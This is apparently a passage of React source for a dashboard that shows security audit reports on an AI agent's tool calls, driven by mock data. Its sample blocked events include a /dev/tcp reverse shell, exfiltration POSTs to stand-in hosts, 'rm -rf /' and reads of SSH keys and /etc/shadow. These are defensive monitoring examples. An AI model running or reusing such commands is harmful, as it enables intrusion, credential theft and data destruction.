import type { MouseEvent } from 'react';
import { useState, useCallback, useEffect } from 'react';
import { motion } from 'framer-motion';
import {
  FileText,
  Search,
  Calendar,
  Activity,
  BarChart3,
  AlertTriangle,
  Clock,
  ChevronLeft,
  Download,
  MoreHorizontal,
  Trash2,
  Check,
  Filter,
  Lock,
  TrendingUp,
} from 'lucide-react';
import { toast } from 'sonner';
import {
  AreaChart,
  Area,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  ResponsiveContainer,
  RadarChart,
  PolarGrid,
  PolarAngleAxis,
  PolarRadiusAxis,
  Radar,
} from 'recharts';
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from '@/components/ui/dialog';
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/components/ui/select';
import { Input } from '@/components/ui/input';
import { Skeleton } from '@/components/ui/skeleton';

/* ------------------------------------------------------------------ */
/*  TYPES                                                              */
/* ------------------------------------------------------------------ */

type ReportStatus = 'generated' | 'processing' | 'failed';
type ReportFormat = 'PDF' | 'JSON';
type RiskLevel = 'low' | 'medium' | 'high';

interface Report {
  id: string;
  name: string;
  dateRange: string;
  startDate: string;
  endDate: string;
  status: ReportStatus;
  format: ReportFormat;
  eventCount: number;
  avgRisk: number;
  anomalyCount: number;
  generatedAt: string;
  relativeTime: string;
  overallRiskScore: number;
  summary: string;
  keyMetrics: {
    totalCalls: number;
    allowedPct: number;
    blockedPct: number;
    avgRisk: number;
  };
  riskTrendData: Array<{ day: string; score: number }>;
  radarData: Array<{ metric: string; current: number; baseline: number }>;
  topEvents: AuditEvent[];
  hmacStatus: {
    verified: boolean;
    blockCount: number;
    verifiedAt: string;
  };
  recommendations: Recommendation[];
}

interface AuditEvent {
  id: string;
  timestamp: string;
  tool: string;
  action: string;
  status: 'allowed' | 'warned' | 'blocked';
  riskScore: number;
}

interface Recommendation {
  priority: RiskLevel;
  title: string;
  description: string;
}

/* ------------------------------------------------------------------ */
/*  MOCK DATA                                                          */
/* ------------------------------------------------------------------ */

const REPORTS: Report[] = [
  {
    id: 'rpt-1',
    name: 'Security Audit Report — Jan 15, 2025',
    dateRange: 'Jan 8 — Jan 15, 2025',
    startDate: '2025-01-08',
    endDate: '2025-01-15',
    status: 'generated',
    format: 'PDF',
    eventCount: 1247,
    avgRisk: 37.2,
    anomalyCount: 3,
    generatedAt: '2025-01-15T14:32:00Z',
    relativeTime: '2h ago',
    overallRiskScore: 32,
    summary:
      'During the reporting period, your Agent made 12,847 MCP tool calls. 92.9% were allowed, 5.3% triggered warnings, and 1.8% were blocked. The overall risk trend is decreasing.',
    keyMetrics: { totalCalls: 12847, allowedPct: 92.9, blockedPct: 1.8, avgRisk: 37.2 },
    riskTrendData: [
      { day: 'Jan 8', score: 42 },
      { day: 'Jan 9', score: 38 },
      { day: 'Jan 10', score: 45 },
      { day: 'Jan 11', score: 35 },
      { day: 'Jan 12', score: 33 },
      { day: 'Jan 13', score: 30 },
      { day: 'Jan 14', score: 34 },
      { day: 'Jan 15', score: 32 },
    ],
    radarData: [
      { metric: 'fs.read', current: 85, baseline: 80 },
      { metric: 'fs.write', current: 40, baseline: 60 },
      { metric: 'api.fetch', current: 70, baseline: 65 },
      { metric: 'db.query', current: 90, baseline: 85 },
      { metric: 'code.exec', current: 20, baseline: 30 },
      { metric: 'net.conn', current: 55, baseline: 50 },
    ],
    topEvents: [
      { id: 'evt-901', timestamp: '2025-01-15 13:42:05', tool: 'filesystem.write', action: 'write /etc/passwd', status: 'blocked', riskScore: 96 },
      { id: 'evt-887', timestamp: '2025-01-14 09:12:33', tool: 'api.fetch', action: 'POST http://45.9.148.7/exfil', status: 'blocked', riskScore: 94 },
      { id: 'evt-856', timestamp: '2025-01-13 22:07:18', tool: 'code.exec', action: 'exec rm -rf /', status: 'blocked', riskScore: 92 },
      { id: 'evt-812', timestamp: '2025-01-12 16:45:02', tool: 'filesystem.read', action: 'read ~/.ssh/id_rsa', status: 'warned', riskScore: 78 },
      { id: 'evt-793', timestamp: '2025-01-11 08:33:41', tool: 'api.fetch', action: 'GET http://api.example.com/data', status: 'allowed', riskScore: 45 },
      { id: 'evt-745', timestamp: '2025-01-10 19:22:09', tool: 'database.query', action: 'SELECT * FROM users', status: 'warned', riskScore: 62 },
    ],
    hmacStatus: { verified: true, blockCount: 1247, verifiedAt: '2025-01-15T14:32:10Z' },
    recommendations: [
      { priority: 'high', title: 'Review filesystem.write permissions', description: '3 blocked attempts to write to sensitive directories. Consider restricting write access.' },
      { priority: 'medium', title: 'Monitor api.fetch external calls', description: 'Unusual external endpoint pattern detected to unknown IP addresses.' },
      { priority: 'low', title: 'Consider response time optimization', description: 'Average response time increased 12% during peak hours.' },
    ],
  },
  {
    id: 'rpt-2',
    name: 'Security Audit Report — Jan 8, 2025',
    dateRange: 'Jan 1 — Jan 8, 2025',
    startDate: '2025-01-01',
    endDate: '2025-01-08',
    status: 'generated',
    format: 'PDF',
    eventCount: 983,
    avgRisk: 41.5,
    anomalyCount: 5,
    generatedAt: '2025-01-08T12:00:00Z',
    relativeTime: '7d ago',
    overallRiskScore: 45,
    summary:
      'During the reporting period, your Agent made 10,234 MCP tool calls. 89.4% were allowed, 7.1% triggered warnings, and 3.5% were blocked. The overall risk trend is stable.',
    keyMetrics: { totalCalls: 10234, allowedPct: 89.4, blockedPct: 3.5, avgRisk: 41.5 },
    riskTrendData: [
      { day: 'Jan 1', score: 48 },
      { day: 'Jan 2', score: 46 },
      { day: 'Jan 3', score: 50 },
      { day: 'Jan 4', score: 43 },
      { day: 'Jan 5', score: 40 },
      { day: 'Jan 6', score: 42 },
      { day: 'Jan 7', score: 44 },
      { day: 'Jan 8', score: 45 },
    ],
    radarData: [
      { metric: 'fs.read', current: 75, baseline: 80 },
      { metric: 'fs.write', current: 50, baseline: 60 },
      { metric: 'api.fetch', current: 60, baseline: 65 },
      { metric: 'db.query', current: 85, baseline: 85 },
      { metric: 'code.exec', current: 25, baseline: 30 },
      { metric: 'net.conn', current: 45, baseline: 50 },
    ],
    topEvents: [
      { id: 'evt-601', timestamp: '2025-01-07 11:22:45', tool: 'code.exec', action: 'exec bash -i >& /dev/tcp/1.2.3.4/4444', status: 'blocked', riskScore: 98 },
      { id: 'evt-598', timestamp: '2025-01-06 15:08:12', tool: 'filesystem.write', action: 'write /usr/bin/malware.sh', status: 'blocked', riskScore: 95 },
      { id: 'evt-554', timestamp: '2025-01-05 07:45:33', tool: 'api.fetch', action: 'GET http://evil.com/payload', status: 'blocked', riskScore: 93 },
    ],
    hmacStatus: { verified: true, blockCount: 983, verifiedAt: '2025-01-08T12:00:15Z' },
    recommendations: [
      { priority: 'high', title: 'Block reverse shell attempts', description: 'Detected blocked reverse shell command execution.' },
      { priority: 'medium', title: 'Whitelist external API domains', description: 'Consider implementing domain whitelist for api.fetch calls.' },
    ],
  },
  {
    id: 'rpt-3',
    name: 'Security Audit Report — Jan 1, 2025',
    dateRange: 'Dec 25 — Jan 1, 2025',
    startDate: '2024-12-25',
    endDate: '2025-01-01',
    status: 'generated',
    format: 'JSON',
    eventCount: 756,
    avgRisk: 28.4,
    anomalyCount: 1,
    generatedAt: '2025-01-01T10:15:00Z',
    relativeTime: '14d ago',
    overallRiskScore: 25,
    summary:
      'During the reporting period, your Agent made 8,421 MCP tool calls. 96.2% were allowed, 2.8% triggered warnings, and 1.0% were blocked. The overall risk trend is low and stable.',
    keyMetrics: { totalCalls: 8421, allowedPct: 96.2, blockedPct: 1.0, avgRisk: 28.4 },
    riskTrendData: [
      { day: 'Dec 25', score: 30 },
      { day: 'Dec 26', score: 28 },
      { day: 'Dec 27', score: 26 },
      { day: 'Dec 28', score: 27 },
      { day: 'Dec 29', score: 25 },
      { day: 'Dec 30', score: 24 },
      { day: 'Dec 31', score: 26 },
      { day: 'Jan 1', score: 25 },
    ],
    radarData: [
      { metric: 'fs.read', current: 80, baseline: 80 },
      { metric: 'fs.write', current: 65, baseline: 60 },
      { metric: 'api.fetch', current: 68, baseline: 65 },
      { metric: 'db.query', current: 88, baseline: 85 },
      { metric: 'code.exec', current: 32, baseline: 30 },
      { metric: 'net.conn', current: 52, baseline: 50 },
    ],
    topEvents: [
      { id: 'evt-301', timestamp: '2024-12-30 04:12:09', tool: 'filesystem.read', action: 'read /etc/shadow', status: 'blocked', riskScore: 91 },
    ],
    hmacStatus: { verified: true, blockCount: 756, verifiedAt: '2025-01-01T10:15:05Z' },
    recommendations: [
      { priority: 'low', title: 'Monitor filesystem.read access', description: 'One attempt to read sensitive system files was blocked.' },
    ],
  },
  {
    id: 'rpt-4',
    name: 'Security Audit Report — Dec 25, 2024',
    dateRange: 'Dec 18 — Dec 25, 2024',
    startDate: '2024-12-18',
    endDate: '2024-12-25',
    status: 'generated',
    format: 'PDF',
    eventCount: 1120,
    avgRisk: 33.8,
    anomalyCount: 2,
    generatedAt: '2024-12-25T16:00:00Z',
    relativeTime: '21d ago',
    overallRiskScore: 35,
    summary:
      'During the reporting period, your Agent made 11,320 MCP tool calls. 94.1% were allowed, 4.2% triggered warnings, and 1.7% were blocked.',
    keyMetrics: { totalCalls: 11320, allowedPct: 94.1, blockedPct: 1.7, avgRisk: 33.8 },
    riskTrendData: [
      { day: 'Dec 18', score: 38 },
      { day: 'Dec 19', score: 36 },
      { day: 'Dec 20', score: 40 },
      { day: 'Dec 21', score: 34 },
      { day: 'Dec 22', score: 32 },
      { day: 'Dec 23', score: 33 },
      { day: 'Dec 24', score: 35 },
      { day: 'Dec 25', score: 35 },
    ],
    radarData: [
      { metric: 'fs.read', current: 82, baseline: 80 },
      { metric: 'fs.write', current: 55, baseline: 60 },
      { metric: 'api.fetch', current: 63, baseline: 65 },
      { metric: 'db.query', current: 87, baseline: 85 },
      { metric: 'code.exec', current: 28, baseline: 30 },
      { metric: 'net.conn', current: 48, baseline: 50 },
    ],
    topEvents: [
      { id: 'evt-201', timestamp: '2024-12-22 18:33:21', tool: 'code.exec', action: 'exec eval(base64_decode(...))', status: 'blocked', riskScore: 90 },
      { id: 'evt-198', timestamp: '2024-12-20 09:15:44', tool: 'api.fetch', action: 'POST http://suspicious.io/data', status: 'warned', riskScore: 72 },
    ],
    hmacStatus: { verified: true, blockCount: 1120, verifiedAt: '2024-12-25T16:00:10Z' },
    recommendations: [
      { priority: 'high', title: 'Disable eval() in code.exec', description: 'Blocked eval usage suggests unnecessary exposure.' },
      { priority: 'medium', title: 'Review API destinations', description: 'Suspicious outbound API call detected.' },
    ],
  },
  {
    id: 'rpt-5',
    name: 'Weekly Security Summary — Dec 18, 2024',
    dateRange: 'Dec 11 — Dec 18, 2024',
    startDate: '2024-12-11',
    endDate: '2024-12-18',
    status: 'processing',
    format: 'PDF',
    eventCount: 892,
    avgRisk: 0,
    anomalyCount: 0,
    generatedAt: '',
    relativeTime: 'Processing...',
    overallRiskScore: 0,
    summary: '',
    keyMetrics: { totalCalls: 0, allowedPct: 0, blockedPct: 0, avgRisk: 0 },
    riskTrendData: [],
    radarData: [],
    topEvents: [],
    hmacStatus: { verified: false, blockCount: 0, verifiedAt: '' },
    recommendations: [],
  },
  {
    id: 'rpt-6',
    name: 'Security Audit Report — Dec 11, 2024',
    dateRange: 'Dec 4 — Dec 11, 2024',
    startDate: '2024-12-04',
    endDate: '2024-12-11',
    status: 'failed',
    format: 'JSON',
    eventCount: 0,
    avgRisk: 0,
    anomalyCount: 0,
    generatedAt: '',
    relativeTime: 'Failed',
    overallRiskScore: 0,
    summary: 'Report generation failed due to insufficient audit data for the selected period.',
    keyMetrics: { totalCalls: 0, allowedPct: 0, blockedPct: 0, avgRisk: 0 },
    riskTrendData: [],
    radarData: [],
    topEvents: [],
    hmacStatus: { verified: false, blockCount: 0, verifiedAt: '' },
    recommendations: [],
  },
];

/* ------------------------------------------------------------------ */
/*  DESIGN TOKENS (inline for self-containment)                        */
/* ------------------------------------------------------------------ */

const tokens = {
  bg: {
    darkest: '#0A0B0E',
    dark: '#0D0E12',
    base: '#111216',
    elevated: '#16181F',
    hover: '#1A1D26',
    input: '#14161E',
  },
  border: {
    subtle: 'rgba(255,255,255,0.04)',
    default: 'rgba(255,255,255,0.06)',
    hover: 'rgba(255,255,255,0.10)',
    focus: '#2979FF',
  },
  text: {
    primary: '#FFFFFF',
    secondary: '#9CA3AF',
    muted: '#5C6270',
    data: '#E8ECF1',
  },
  accent: {
    blue: '#2979FF',
    green: '#00D4AA',
    amber: '#F5A623',
    red: '#FF4D4F',
    purple: '#7B61FF',
    teal: '#00E5FF',
  },
};

/* ------------------------------------------------------------------ */
/*  HELPER FUNCTIONS                                                   */
/* ------------------------------------------------------------------ */

function riskColor(score: number): string {
  if (score >= 70) return tokens.accent.red;
  if (score >= 30) return tokens.accent.amber;
  return tokens.accent.green;
}

function riskLabel(score: number): string {
  if (score >= 70) return 'High Risk';
  if (score >= 30) return 'Medium Risk';
  return 'Low Risk';
}

function statusDotColor(status: ReportStatus): string {
  switch (status) {
    case 'generated':
      return tokens.accent.green;
    case 'processing':
      return tokens.accent.amber;
    case 'failed':
      return tokens.accent.red;
  }
}

function statusBadgeText(status: ReportStatus): string {
  switch (status) {
    case 'generated':
      return 'Generated';
    case 'processing':
      return 'Processing';
    case 'failed':
      return 'Failed';
  }
}

/* ------------------------------------------------------------------ */
/*  EASING                                                             */
/* ------------------------------------------------------------------ */

const easeOutExpo = [0.16, 1, 0.3, 1] as [number, number, number, number];
const easeSmooth = [0.4, 0, 0.2, 1] as [number, number, number, number];

/* ------------------------------------------------------------------ */
/*  PAGE-LEVEL STYLES                                                  */
/* ------------------------------------------------------------------ */

const pageStyles: Record<string, React.CSSProperties> = {
  container: {
    backgroundColor: tokens.bg.dark,
    color: tokens.text.primary,
    fontFamily: 'Inter, system-ui, -apple-system, sans-serif',
  },
  mono: {
    fontFamily: '"JetBrains Mono", "Fira Code", monospace',
  },
};

/* ------------------------------------------------------------------ */
/*  LOADING SKELETONS                                                  */
/* ------------------------------------------------------------------ */

function ReportCardSkeleton() {
  return (
    <div
      className="rounded-xl p-5 border"
      style={{
        backgroundColor: tokens.bg.base,
        borderColor: tokens.border.subtle,
      }}
    >
      <div className="flex justify-between items-start mb-4">
        <Skeleton className="h-5 w-12 rounded-full" style={{ backgroundColor: tokens.bg.elevated }} />
        <Skeleton className="h-3 w-3 rounded-full" style={{ backgroundColor: tokens.bg.elevated }} />
      </div>
      <Skeleton className="h-5 w-3/4 mb-2" style={{ backgroundColor: tokens.bg.elevated }} />
      <Skeleton className="h-4 w-1/2 mb-4" style={{ backgroundColor: tokens.bg.elevated }} />
      <div className="flex gap-4 mb-4">
        <Skeleton className="h-4 w-20" style={{ backgroundColor: tokens.bg.elevated }} />
        <Skeleton className="h-4 w-20" style={{ backgroundColor: tokens.bg.elevated }} />
        <Skeleton className="h-4 w-20" style={{ backgroundColor: tokens.bg.elevated }} />
      </div>
      <div className="flex justify-between items-center pt-3 border-t" style={{ borderColor: tokens.border.subtle }}>
        <Skeleton className="h-3 w-24" style={{ backgroundColor: tokens.bg.elevated }} />
        <div className="flex gap-2">
          <Skeleton className="h-3 w-8" style={{ backgroundColor: tokens.bg.elevated }} />
          <Skeleton className="h-3 w-8" style={{ backgroundColor: tokens.bg.elevated }} />
        </div>
      </div>
    </div>
  );
}

function SkeletonGrid() {
  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
      {Array.from({ length: 6 }).map((_, i) => (
        <ReportCardSkeleton key={i} />
      ))}
    </div>
  );
}

/* ------------------------------------------------------------------ */
/*  REPORT CARD                                                        */
/* ------------------------------------------------------------------ */

function ReportCard({
  report,
  index,
  onView,
}: {
  report: Report;
  index: number;
  onView: (r: Report) => void;
}) {
  const isGenerated = report.status === 'generated';

  return (
    <motion.div
      initial={{ opacity: 0, y: 30 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{
        duration: 0.5,
        delay: index * 0.08,
        ease: easeOutExpo,
      }}
      whileHover={{
        y: -2,
        boxShadow: '0 8px 24px rgba(0,0,0,0.3)',
        borderColor: tokens.border.hover,
      }}
      className="rounded-xl border p-5 cursor-pointer transition-colors"
      style={{
        backgroundColor: tokens.bg.base,
        borderColor: tokens.border.subtle,
        borderTop: `2px solid ${report.status === 'generated' ? tokens.accent.blue : statusDotColor(report.status)}`,
      }}
      onClick={() => isGenerated && onView(report)}
    >
      {/* Top bar: format badge + status dot */}
      <div className="flex justify-between items-start mb-3">
        <span
          className="text-xs font-medium px-2.5 py-1 rounded-full border"
          style={{
            color: tokens.accent.blue,
            borderColor: 'rgba(41,121,255,0.2)',
            backgroundColor: 'rgba(41,121,255,0.12)',
            fontSize: '12px',
          }}
        >
          {report.format}
        </span>
        <div className="flex items-center gap-1.5">
          <motion.div
            className="w-2 h-2 rounded-full"
            style={{ backgroundColor: statusDotColor(report.status) }}
            animate={
              report.status === 'processing'
                ? { opacity: [0.4, 1, 0.4] }
                : {}
            }
            transition={
              report.status === 'processing'
                ? { duration: 1.5, repeat: Infinity, ease: 'easeInOut' }
                : {}
            }
          />
          <span
            className="text-xs font-medium"
            style={{ color: statusDotColor(report.status), fontSize: '12px' }}
          >
            {statusBadgeText(report.status)}
          </span>
        </div>
      </div>

      {/* Report title */}
      <h3
        className="font-semibold mb-1 truncate"
        style={{ color: tokens.text.primary, fontSize: '16px', lineHeight: 1.3 }}
      >
        {report.name}
      </h3>

      {/* Date range */}
      <div className="flex items-center gap-1.5 mb-4" style={{ color: tokens.text.secondary }}>
        <Calendar size={14} />
        <span className="text-sm" style={{ fontSize: '13px' }}>
          {report.dateRange}
        </span>
      </div>

      {/* Metrics row */}
      {isGenerated && (
        <div className="flex gap-4 mb-4">
          <div className="flex items-center gap-1" style={{ color: tokens.text.secondary }}>
            <Activity size={14} />
            <span className="text-sm" style={{ fontSize: '13px' }}>
              {report.eventCount.toLocaleString()} events
            </span>
          </div>
          <div className="flex items-center gap-1" style={{ color: riskColor(report.avgRisk) }}>
            <BarChart3 size={14} />
            <span className="text-sm" style={{ fontSize: '13px' }}>
              Avg Risk: {report.avgRisk}
            </span>
          </div>
          <div className="flex items-center gap-1" style={{ color: tokens.accent.amber }}>
            <AlertTriangle size={14} />
            <span className="text-sm" style={{ fontSize: '13px' }}>
              {report.anomalyCount} anomalies
            </span>
          </div>
        </div>
      )}

      {/* Bottom bar */}
      <div
        className="flex justify-between items-center pt-3 border-t"
        style={{ borderColor: tokens.border.subtle }}
      >
        <div className="flex items-center gap-1" style={{ color: tokens.text.muted }}>
          <Clock size={12} />
          <span style={{ fontSize: '12px', fontWeight: 500, letterSpacing: '0.02em' }}>
            {report.relativeTime}
          </span>
        </div>
        <div className="flex items-center gap-2">
          {isGenerated && (
            <button
              onClick={(e) => {
                e.stopPropagation();
                onView(report);
              }}
              className="text-sm font-medium transition-colors hover:brightness-110"
              style={{ color: tokens.accent.blue, fontSize: '13px' }}
            >
              View
            </button>
          )}
          {isGenerated && (
            <button
              onClick={(e) => {
                e.stopPropagation();
                toast.success('Report download started');
              }}
              className="p-1 rounded-md transition-colors"
              style={{ color: tokens.text.secondary }}
              onMouseEnter={(e) =>
                (e.currentTarget.style.color = tokens.text.primary)
              }
              onMouseLeave={(e) =>
                (e.currentTarget.style.color = tokens.text.secondary)
              }
            >
              <Download size={16} />
            </button>
          )}
          <button
            onClick={(e) => e.stopPropagation()}
            className="p-1 rounded-md transition-colors"
            style={{ color: tokens.text.secondary }}
            onMouseEnter={(e) =>
              (e.currentTarget.style.color = tokens.text.primary)
            }
            onMouseLeave={(e) =>
              (e.currentTarget.style.color = tokens.text.secondary)
            }
          >
            <MoreHorizontal size={16} />
          </button>
        </div>
      </div>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  EMPTY STATE                                                        */
/* ------------------------------------------------------------------ */

function EmptyState({ onGenerate }: { onGenerate: () => void }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.5, ease: easeOutExpo }}
      className="flex flex-col items-center justify-center py-24 text-center"
    >
      <div
        className="w-16 h-16 rounded-2xl flex items-center justify-center mb-6"
        style={{
          backgroundColor: tokens.bg.elevated,
          color: tokens.text.muted,
        }}
      >
        <FileText size={32} />
      </div>
      <h2
        className="font-semibold mb-2"
        style={{
          fontSize: '32px',
          lineHeight: 1.15,
          letterSpacing: '-0.02em',
          color: tokens.text.primary,
        }}
      >
        No reports yet
      </h2>
      <p
        className="mb-8 max-w-md"
        style={{ fontSize: '14px', lineHeight: 1.5, color: tokens.text.secondary }}
      >
        Generate your first audit report to review your Agent&apos;s security posture.
      </p>
      <button
        onClick={onGenerate}
        className="flex items-center gap-2 px-5 py-2.5 rounded-lg font-semibold text-white transition-all hover:brightness-110"
        style={{
          background: `linear-gradient(135deg, ${tokens.accent.blue}, #1E88E5)`,
          fontSize: '14px',
          lineHeight: 1.3,
        }}
      >
        <FileText size={16} />
        Generate First Report
      </button>
    </motion.div>
  );
}

/* ------------------------------------------------------------------ */
/*  GENERATE REPORT MODAL                                              */
/* ------------------------------------------------------------------ */

type DatePreset = '24h' | '7d' | '30d' | '90d';
type ReportTypeOption = 'full' | 'anomaly' | 'behavioral';

function GenerateReportModal({
  open,
  onClose,
  onGenerate,
}: {
  open: boolean;
  onClose: () => void;
  onGenerate: (report: Report) => void;
}) {
  const [reportName, setReportName] = useState('');
  const [startDate, setStartDate] = useState('');
  const [endDate, setEndDate] = useState('');
  const [datePreset, setDatePreset] = useState<DatePreset>('7d');
  const [reportType, setReportType] = useState<ReportTypeOption>('full');
  const [exportFormat, setExportFormat] = useState<'PDF' | 'JSON'>('PDF');
  const [sections, setSections] = useState<Record<string, boolean>>({
    executiveSummary: true,
    riskTrend: true,
    behavioralBaseline: true,
    fullEventLog: true,
    hmacVerification: true,
    recommendations: true,
  });
  const [isGenerating, setIsGenerating] = useState(false);

  const datePresets: { value: DatePreset; label: string }[] = [
    { value: '24h', label: 'Last 24h' },
    { value: '7d', label: 'Last 7d' },
    { value: '30d', label: 'Last 30d' },
    { value: '90d', label: 'Last 90d' },
  ];

  const reportTypeOptions: { value: ReportTypeOption; label: string; description: string }[] = [
    { value: 'full', label: 'Full Audit Report', description: 'Comprehensive with all data' },
    { value: 'anomaly', label: 'Anomaly Summary', description: 'Only anomalous/warned/blocked events' },
    { value: 'behavioral', label: 'Behavioral Analysis', description: 'Focus on baseline deviations' },
  ];

  const toggleSection = (key: string) => {
    setSections((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const handleGenerate = () => {
    setIsGenerating(true);
    setTimeout(() => {
      const now = new Date();
      const dateStr = now.toLocaleDateString('en-US', {
        month: 'short',
        day: 'numeric',
        year: 'numeric',
      });
      const newReport: Report = {
        id: `rpt-${Date.now()}`,
        name: reportName || `Security Audit Report — ${dateStr}`,
        dateRange: `${startDate || 'Jan 8'} — ${endDate || dateStr}`,
        startDate: startDate || '2025-01-08',
        endDate: endDate || '2025-01-15',
        status: 'generated',
        format: exportFormat,
        eventCount: 1247,
        avgRisk: 37.2,
        anomalyCount: 3,
        generatedAt: now.toISOString(),
        relativeTime: 'just now',
        overallRiskScore: 32,
        summary:
          'During the reporting period, your Agent made 12,847 MCP tool calls. 92.9% were allowed, 5.3% triggered warnings, and 1.8% were blocked. The overall risk trend is decreasing.',
        keyMetrics: { totalCalls: 12847, allowedPct: 92.9, blockedPct: 1.8, avgRisk: 37.2 },
        riskTrendData: [
          { day: 'Mon', score: 42 },
          { day: 'Tue', score: 38 },
          { day: 'Wed', score: 45 },
          { day: 'Thu', score: 35 },
          { day: 'Fri', score: 33 },
          { day: 'Sat', score: 30 },
          { day: 'Sun', score: 32 },
        ],
        radarData: [
          { metric: 'fs.read', current: 85, baseline: 80 },
          { metric: 'fs.write', current: 40, baseline: 60 },
          { metric: 'api.fetch', current: 70, baseline: 65 },
          { metric: 'db.query', current: 90, baseline: 85 },
          { metric: 'code.exec', current: 20, baseline: 30 },
          { metric: 'net.conn', current: 55, baseline: 50 },
        ],
        topEvents: [
          { id: 'evt-901', timestamp: '2025-01-15 13:42:05', tool: 'filesystem.write', action: 'write /etc/passwd', status: 'blocked', riskScore: 96 },
          { id: 'evt-887', timestamp: '2025-01-14 09:12:33', tool: 'api.fetch', action: 'POST http://45.9.148.7/exfil', status: 'blocked', riskScore: 94 },
        ],
        hmacStatus: { verified: true, blockCount: 1247, verifiedAt: now.toISOString() },
        recommendations: [
          { priority: 'high', title: 'Review filesystem.write permissions', description: '3 blocked attempts to write to sensitive directories.' },
          { priority: 'medium', title: 'Monitor api.fetch external calls', description: 'Unusual external endpoint pattern detected.' },
          { priority: 'low', title: 'Consider response time optimization', description: 'Average response time increased 12% during peak hours.' },
        ],
      };
      setIsGenerating(false);
      onGenerate(newReport);
      onClose();
    }, 1500);
  };

  const sectionLabels: Record<string, string> = {
    executiveSummary: 'Executive Summary',
    riskTrend: 'Risk Trend Analysis',
    behavioralBaseline: 'Behavioral Baseline Chart',
    fullEventLog: 'Full Event Log',
    hmacVerification: 'HMAC Chain Verification',
    recommendations: 'Recommendations',
  };

  return (
    <Dialog open={open} onOpenChange={(_val) => !isGenerating && onClose()}>
      <DialogContent
        className="border-0 p-0 gap-0 overflow-hidden sm:max-w-[520px]"
        style={{
          backgroundColor: tokens.bg.elevated,
          border: `1px solid ${tokens.border.default}`,
          borderRadius: '16px',
          color: tokens.text.primary,
        }}
      >
        {/* Backdrop handled by Dialog */}
        <motion.div
          initial={{ opacity: 0, scale: 0.95 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0, scale: 0.95 }}
          transition={{ duration: 0.2, ease: easeOutExpo }}
        >
          <DialogHeader className="p-6 pb-2">
            <DialogTitle
              className="text-2xl font-semibold"
              style={{ letterSpacing: '-0.01em', color: tokens.text.primary }}
            >
              Generate Audit Report
            </DialogTitle>
            <DialogDescription style={{ color: tokens.text.secondary, fontSize: '14px' }}>
              Configure your report parameters
            </DialogDescription>
          </DialogHeader>

          <div className="px-6 py-4 space-y-5">
            {/* Report Name */}
            <div>
              <label
                className="block text-sm mb-1.5"
                style={{ color: tokens.text.secondary, fontSize: '13px' }}
              >
                Report Name
              </label>
              <Input
                placeholder="e.g., Weekly Security Audit"
                value={reportName}
                onChange={(e) => setReportName(e.target.value)}
                className="border-0 text-white placeholder:text-[#5C6270]"
                style={{
                  backgroundColor: tokens.bg.input,
                  border: `1px solid ${tokens.border.subtle}`,
                  borderRadius: '8px',
                  padding: '10px 14px',
                  fontSize: '14px',
                }}
              />
            </div>

            {/* Date Range */}
            <div>
              <label
                className="block text-sm mb-1.5"
                style={{ color: tokens.text.secondary, fontSize: '13px' }}
              >
                Date Range
              </label>
              <div className="grid grid-cols-2 gap-3 mb-3">
                <Input
                  type="date"
                  placeholder="Start Date"
                  value={startDate}
                  onChange={(e) => setStartDate(e.target.value)}
                  className="border-0 text-white placeholder:text-[#5C6270]"
                  style={{
                    backgroundColor: tokens.bg.input,
                    border: `1px solid ${tokens.border.subtle}`,
                    borderRadius: '8px',
                    padding: '10px 14px',
                    fontSize: '14px',
                  }}
                />
                <Input
                  type="date"
                  placeholder="End Date"
                  value={endDate}
                  onChange={(e) => setEndDate(e.target.value)}
                  className="border-0 text-white placeholder:text-[#5C6270]"
                  style={{
                    backgroundColor: tokens.bg.input,
                    border: `1px solid ${tokens.border.subtle}`,
                    borderRadius: '8px',
                    padding: '10px 14px',
                    fontSize: '14px',
                  }}
                />
              </div>
              <div className="flex gap-2">
                {datePresets.map((preset) => (
                  <button
                    key={preset.value}
                    onClick={() => setDatePreset(preset.value)}
                    className="px-3 py-1.5 rounded-lg text-xs font-medium transition-all border"
                    style={{
                      backgroundColor:
                        datePreset === preset.value
                          ? tokens.bg.base
                          : 'transparent',
                      borderColor:
                        datePreset === preset.value
                          ? tokens.accent.blue
                          : tokens.border.subtle,
                      color:
                        datePreset === preset.value
                          ? tokens.accent.blue
                          : tokens.text.secondary,
                    }}
                  >
                    {preset.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Report Type */}
            <div>
              <label
                className="block text-sm mb-1.5"
                style={{ color: tokens.text.secondary, fontSize: '13px' }}
              >
                Report Type
              </label>
              <div className="space-y-2">
                {reportTypeOptions.map((opt) => (
                  <button
                    key={opt.value}
                    onClick={() => setReportType(opt.value)}
                    className="w-full flex items-start gap-3 p-3 rounded-lg border transition-all text-left"
                    style={{
                      backgroundColor: tokens.bg.base,
                      borderColor:
                        reportType === opt.value
                          ? tokens.accent.blue
                          : tokens.border.subtle,
                    }}
                  >
                    <div
                      className="w-4 h-4 rounded-full border-2 mt-0.5 flex-shrink-0 flex items-center justify-center"
                      style={{
                        borderColor:
                          reportType === opt.value
                            ? tokens.accent.blue
                            : tokens.border.default,
                      }}
                    >
                      {reportType === opt.value && (
                        <div
                          className="w-2 h-2 rounded-full"
                          style={{ backgroundColor: tokens.accent.blue }}
                        />
                      )}
                    </div>
                    <div>
                      <div
                        className="text-sm font-medium"
                        style={{ color: tokens.text.primary }}
                      >
                        {opt.label}
                      </div>
                      <div
                        className="text-xs"
                        style={{ color: tokens.text.secondary }}
                      >
                        {opt.description}
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Export Format */}
            <div>
              <label
                className="block text-sm mb-1.5"
                style={{ color: tokens.text.secondary, fontSize: '13px' }}
              >
                Export Format
              </label>
              <div
                className="inline-flex rounded-lg p-0.5 border"
                style={{ backgroundColor: tokens.bg.base, borderColor: tokens.border.subtle }}
              >
                {(['PDF', 'JSON'] as const).map((fmt) => (
                  <button
                    key={fmt}
                    onClick={() => setExportFormat(fmt)}
